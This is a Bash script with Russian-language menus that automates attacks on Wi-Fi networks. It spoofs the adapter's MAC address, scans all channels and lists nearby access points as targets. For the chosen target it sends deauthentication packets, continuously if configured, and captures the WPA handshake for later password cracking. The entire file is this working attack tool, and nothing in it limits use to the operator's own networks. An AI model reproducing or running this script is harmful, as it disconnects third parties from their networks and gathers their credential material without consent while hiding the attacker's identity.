#!/bin/bash



function init {

	tc_Green="\033[32m"
	tc_Blue="\033[36m"
	tc_DarkBlue="\033[34m"
	tc_Yellow="\033[33m"
	tc_Red="\033[31m"
	tc_Grey="\033[37m"
	tc_Purpure="\033[35m"

	interfaceChoose=0

	boolMonitor="true"
	boolAllScan="True"
	boolBackToMainmenu="False"
	boolSetDefaultDriver="False"

	var1=1000

	Date=$(date +%Y_%m_%d-%T)
	curentTime=$( echo $Date | cut -d '-' -f 2 )
	nameUserFolder=$( ls /home )

	workFolder="/home/$nameUserFolder/Desktop/Data/catch_handshake/$Date"
	mkdir -p $workFolder/allScan

	arrayFiles=(".channel.txt" ".count_deauth.txt" ".nameDriver.txt" ".showTargetOnly.txt")
	for nameFile in ${arrayFiles[@]}
		do
			if test -f $nameFile
				then
					continue
				else
					touch $nameFile
			fi
		done


	boolShowTargetsOnly=$(cat .showTargetOnly.txt)
	count_deauth=$(cat .count_deauth.txt)
	nameDriver=$(cat .nameDriver.txt)
	show_channel=$(cat .channel.txt)


}

function choose_interface {

	massive_interfaces=()
	massive_drivers=()
	countInterfaces=$(iw dev | grep Interface | awk -F " " '{print $2}' | wc -l)		# Узнаем колличество интерфейсов
	interface=$(iw dev 	| grep Interface | awk -F " " '{print $2}')						# Узнаем названия интерфейсов
	echo " "
	for (( i=0; i <= $countInterfaces; i++ ))
		do
			if [ "$i" == "0" ]
			then
			echo -e "$tc_Green $i)$tc_Yellow >>> EXIT <<< $tc_Grey"
		
			massive_interfaces+=("empty")
			massive_drivers+=("empty")
			
			else
				
				element=$(echo $interface |  cut -d ' ' -f $i)

				nameDriver=$(nmcli | grep $element -A 3 | grep "wifi" | grep "("  | cut -d ")" -f 1 | cut -d "(" -f 2)
				nameESSID=$(iwconfig $element | grep ESSID: | awk -F " " '{print $4}' | sed 's/ESSID:off\/any/ /g' )
				inetIP=$(ifconfig $element  | grep netmask | cut -d " " -f 1-10 )

				setNameDriver=$(cat .nameDriver.txt)

				if [ "$nameDriver" == "$setNameDriver" ]  &&  [ "$boolMonitor" == "true" ] 
					then
						echo -e "$tc_Green $i)$tc_Grey $element $tc_DarkBlue- $nameDriver"$tc_Grey $inetIP $nameESSID 
						massive_interfaces+=("$element")
						massive_drivers+=("$nameDriver")

				elif [ "$setNameDriver" == "" ] || [ "$boolSetDefaultDriver" == "True" ]
					then
						boolSetDefaultDriver="True"
						# echo "Укажите какой интерфейс надо установить для сканирования и использовать в дальнейшем по умолчанию. ВНИМАНИЕ указывать надо по названию драйвера а не по названию интерфейса .т.к. имя интерфейса может меняться. В дальнейшем в настройках можно будет изменить название драйвера. Wi-Fi должен поддреживать режим монитора. "
						echo -e "$tc_Green $i)$tc_Grey $element $tc_DarkBlue- $nameDriver"$tc_Grey $inetIP
						massive_interfaces+=("$element")
						massive_drivers+=("$nameDriver")

				elif [ "$boolMonitor" == "false" ]
					then
						echo -e "$tc_Green $i)$tc_Grey $element $tc_DarkBlue- $nameDriver"$tc_Grey $inetIP $nameESSID 
						massive_interfaces+=("$element")
						massive_drivers+=("$nameDriver")
				fi
			fi
		done

		if [ "$boolSetDefaultDriver" == "True" ]
			then
				echo -e "\nУкажите какой драйер интерфейса надо установить для сканирования и использовать его в дальнейшем по умолчанию. \nВНИМАНИЕ указывать надо по названию драйвера, а не по названию интерфейса .т.к. название интерфейса может меняться. \nВ дальнейшем в настройках можно будет изменить название драйвера. \nВНИМАНИЕ Wi-Fi интерфейс должен поддреживать режим монитора.\n"
		fi	
		
		lenghts_massive_interfaces=${#massive_interfaces[@]}
	
		if [ "$lenghts_massive_interfaces" == "2" ]
			then 
				interfaceChoose=1
	
		elif [ "$lenghts_massive_interfaces" == "1" ]
			then
				echo -e -n "$tc_Red Нет интерфейсов для сканирования. Проверьте подключение внешних Wi-Fi адаптеров. $tc_Grey "
				boolSetInterface="False"
				# exit
		else 
			echo -e -n "$tc_Green Укажите номер Wi-Fi интерфейса: $tc_Grey"
			read interfaceChoose

			
			if [ -z $interfaceChoose ]
				then
					echo -e $tc_Red" Не указан интерфейс для сканирования."$tc_Grey
					exit
			fi
		fi
	
		if [ "$interfaceChoose" == "0" ]
			then
				rm -r -f $workFolder
				exit
			else
				interface=${massive_interfaces[$interfaceChoose]}
				nameDriver=${massive_drivers[$interfaceChoose]}
				#echo "$interface"
		fi


		if [ "$boolSetDefaultDriver" == "True" ]
			then
				echo "$nameDriver" > .nameDriver.txt
		fi


		echo " "
	
}

function charging {

    chargingPerson=$( acpi | cut -d " " -f 4 | cut -d "%" -f 1 )

    #$a -ge $b # больше или равно
    #$a -le $b # меньше или равно

    if [ $chargingPerson -le 30 ]
        then
        echo -e $tc_Red "Уровень заряда батарей:$tc_Grey $chargingPerson%"

    elif [ $chargingPerson -le 70 ]
        then
        echo -e $tc_Yellow "Уровень заряда батарей:$tc_Grey $chargingPerson%"
    
    else
        echo -e $tc_Green "Уровень заряда батарей:$tc_Grey $chargingPerson%"

    fi

}

function settings {

	
	if [ "$boolShowTargetsOnly" == "" ]
		then
			echo "False" > .showTargetOnly.txt
			boolShowTargetsOnly="False"
	fi
	
	if [ "$show_channel" == "" ]
		then
			
			show_channel="Все (1-177) "
	fi

	echo -e $tc_Green"0)$tc_Yellow >>> EXIT <<< $tc_Grey"
	echo -e $tc_Green"1)$tc_Grey Синхронизировать время ( требует перезарузки программы ):$tc_Yellow $curentTime"
	echo -e $tc_Green"2)$tc_Grey Установить каналы для сканирования:$tc_Yellow $show_channel "
	echo -e $tc_Green"3)$tc_Grey Установить продолжительность деаутификации:$tc_Yellow $count_deauth"
	echo -e $tc_Green"4)$tc_Grey Установить Wi-Fi драйвер по умолчанию:$tc_Yellow $nameDriver"
	echo -e $tc_Green"5)$tc_Grey Показывать тоько подсвеченные цели:$tc_Yellow $boolShowTargetsOnly"
	
	echo -e $tc_Green"d)$tc_Red >>> УДАЛИТЬ настройки <<<"$tc_Grey
	echo -e $tc_Green"x)$tc_Yellow Вернуться в прежнее меню $tc_Grey"
	echo ""
	echo -n -e "$tc_Green Выбрано: $tc_Grey"
	read choose_setting
	
	if [ "$choose_setting" == "0" ]
	then 
		saveAndExit
		exit

	elif [ "$choose_setting" == "2" ]	
		then
		echo " Примеры:"
		echo ""
		echo -e "	канал: 1"
		echo -e "	каналы: 1,2,5,8"
		echo -e "	диапазон каналов: 36-177 для сканирования"
		echo ""
		echo -n -e "$tc_Green Выбрано: $tc_Grey"
		read channel
		echo "$channel" > .channel.txt
	elif [ "$choose_setting" == "1" ]	
		then
		echo ""
		echo -n -e $tc_Green" Укажите текущий час: "$tc_Grey
		read hour
		echo -n -e $tc_Green" Укажите текущие минуты: "$tc_Grey
		read minute
		sudo date +%T -s "$hour:$minute:00"
	elif [ "$choose_setting" == "3" ]	
		then
		
		if [ "$count_deauth" != "" ]
			then 
				echo -e " Количиство пакетов деаутификации установленно на:$tc_Yellow '$count_deauth' $tc_Grey"
		fi
		echo -e " Укажите колличество пакетов деаутификации от$tc_Yellow '1-100'"$tc_Grey
		echo -n -e " Значение$tc_Yellow '0'$tc_Grey для непрерывной деаутификации: "$tc_Grey
		read count_deauth
		echo "$count_deauth" > .count_deauth.txt

	elif [ "$choose_setting" == "4" ]	
		then
		boolSetDefaultDriver="True"
		choose_interface

	elif [ "$choose_setting" == "5" ]	 # showTargetOnly
		then
			echo -e -n "Показывать только подсвеченные цели$tc_Yellow y/n: $tc_Grey"
			read str_showTargetOnly
			if [ "$str_showTargetOnly" == "y" ]
				then
					echo "True" > .showTargetOnly.txt
					boolShowTargetsOnly="True"
				else
					echo "False" > .showTargetOnly.txt
					boolShowTargetsOnly="False"
			fi

	elif [ "$choose_setting" == "d" ]	
		then
			for nameFile in ${arrayFiles[@]}
				do
					rm -f $nameFile
				done

	elif [ "$choose_setting" == "x" ]	
		then
			boolBackToMainmenu="True"
		
	fi	

}

function mode_Managed {

	sudo ifconfig $interface down		
	sudo iwconfig $interface mode Managed
	sudo ifconfig $interface up

}

function saveAndContinue {

	mode_Managed
	echo -e "$tc_Green Сохронить результат захвата$tc_Yellow handshake?$tc_Grey \n" 
	echo -e "$tc_Green y)$tc_Grey Да"
	echo -e "$tc_Green n)$tc_Grey Нет \n" 
	echo -n -e "$tc_Green Выбрано: $tc_Grey"
	read seveHandshake

	if [ "$seveHandshake" == "n" ]
		then
			rm -r -f $handshakeFolder	
	fi

}

function saveAndExit {

	sudo nmcli radio wifi off
    mode_Managed
    echo -e "$tc_Green Сохронить результаты?$tc_Grey \n" 
    echo -e "$tc_Green y)$tc_Grey Да"
    echo -e "$tc_Green n)$tc_Grey Нет \n" 
    echo -n -e "$tc_Green Выбрано: $tc_Grey"
    read seveResults

    if [ "$seveResults" == "y" ]
        then
        echo " "
        echo -n -e "$tc_Green Указать название места: $tc_Grey"
        read namePosition
        mv $workFolder "$workFolder $namePosition"
        exit
    else
        rm -r -f $workFolder
        exit
    fi
}

function allScan {

	sudo ifconfig $interface down    
	sudo macchanger -a $interface
	sudo ifconfig $interface up  

	channel=$( cat ${arrayFiles[0]} )
	if [ -z $channel ]
		then
			fullChannel="--channel 1-177"
		else
			fullChannel="--channel $channel"
	fi
	sudo airodump-ng --berlin 60000 $fullChannel -w $workFolder/allScan/scan $interface
	mode_Managed

}

function takeTarget_to_catch_handshake {

	massive_targets=()
	massive_channels=()
	massive_ESSID=()
		
	lines=$(cat $workFolder/allScan/scan-01.csv | grep : | wc -l )
	targets=$(cat $workFolder/allScan/scan-01.csv | grep : |  cut -d ',' -f 1 )
	channels=$(cat $workFolder/allScan/scan-01.csv | grep : |  cut -d ',' -f 4 )
	essids=$(cat $workFolder/allScan/scan-01.csv | grep : |  cut -d ',' -f 14 | sed 'y/ /_/' )
	
	for (( t=0; t <= $lines; t++ ))
	do
		if [ "$t" == "0" ]
		then
			massive_targets+=("EXIT")
			massive_channels+=("EXIT")
			massive_ESSID+=("EXIT")
		else
			target=$(echo $targets |  cut -d ' ' -f $t)
			channel=$(echo $channels |  cut -d ' ' -f $t)
			essid=$(echo $essids |  cut -d ' ' -f $t)
			#clients=$(echo $essids |  cut -d ' ' -f $t)
			
			if [ -z "$essid" ]
				then
				#echo "$target essid is NULL"
					echo ""
		
			else
				
				massive_targets+=("$target")
				massive_channels+=("$channel")
				massive_ESSID+=("$essid")
			fi
		fi
		
	done
	charging


	echo " "
	echo -e "$tc_Green====> Список целей <==== $tc_Grey"
	echo " "	
	for (( g=0; g <= ((${#massive_targets[@]} - 1 )) ; g++ ))
	do
		if [ "$g" == "0" ]
			then
			echo -e "$tc_Green$g)$tc_Yellow >>> EXIT <<< $tc_Grey"
		else 

			client=$(cat $workFolder/allScan/scan-01.csv | grep Station -A 50 | cut -d ',' -f 1,6 | grep -v "(not associated)" | grep -v Station | grep "${massive_targets[g]}")
			
			if [ "$client" == "" ] && [ "$boolShowTargetsOnly" == "False" ]
				then
				echo -e "$tc_Green$g)$tc_Grey ${massive_targets[g]} ${massive_ESSID[g]}"

			elif [ "$client" == "" ] && [ "$boolShowTargetsOnly" == "True" ]
				then
					continue
			else
				echo -e "$tc_Green$g)$tc_Grey ${massive_targets[g]}$tc_Green ${massive_ESSID[g]}"$tc_Grey 
			fi
			
		fi
	done
	
	echo " "
	echo -e $tc_Green"r)$tc_Blue Повторить сканирование $tc_Grey"
	echo -e $tc_Green"s)$tc_Blue Настройки $tc_Grey"
	
	echo " "
	echo -n -e "$tc_Green Выбрано: $tc_Grey"
	read myChooseOfTarget
	echo " "

	if [ -z $myChooseOfTarget ]
		then
			return
	
	elif [ "$myChooseOfTarget" == "0" ]
		then
			saveAndExit
	elif [ "$myChooseOfTarget" == "r" ]
		then
			rm -f $workFolder/allScan/*.*
			boolAllScan="True"
			return
		
	elif [ "$myChooseOfTarget" == "s" ]
		then
			boolBackToMainmenu="True"
			return
	fi
		
	cannel=${massive_channels[(myChooseOfTarget)]}
	MAC_target=${massive_targets[(myChooseOfTarget)]}
	ESSID=${massive_ESSID[(myChooseOfTarget)]}
	
	time=$( date +%T )
	
	handshakeFolder="$workFolder/handshake/$time-$ESSID-$MAC_target"
	mkdir -p $handshakeFolder

	sudo airmon-ng start $interface $cannel
	sleep 2
	check_interface=$(iw dev | grep $interface | awk -F " " '{print $2}')


	count_deauth=$(cat .count_deauth.txt)
	if [ -z $count_deauth ]
		then
		count_deauth=5
	fi
	sudo aireplay-ng --deauth  $count_deauth -a $MAC_target $check_interface
	sudo airodump-ng --bssid $MAC_target -c $cannel -w $handshakeFolder/scan $check_interface # - захват хендшейка
	sudo airmon-ng stop $check_interface

	saveAndContinue
	
	
}

sudo nmcli radio wifi on
 
init
choose_interface


while [ $var1 != 0 ]

	do	
		
		if [ "$boolAllScan" == "True" ] && [ "$boolSetInterface" != "False" ]
			then
			clear
				allScan
				boolAllScan="False"

		fi

		

		if [ "$boolSetInterface" != "False" ]
			then
			clear
				takeTarget_to_catch_handshake
		fi

		if [ "$boolBackToMainmenu" == "True" ]
			then
			clear
				settings
				boolBackToMainmenu="False"
		fi
	done






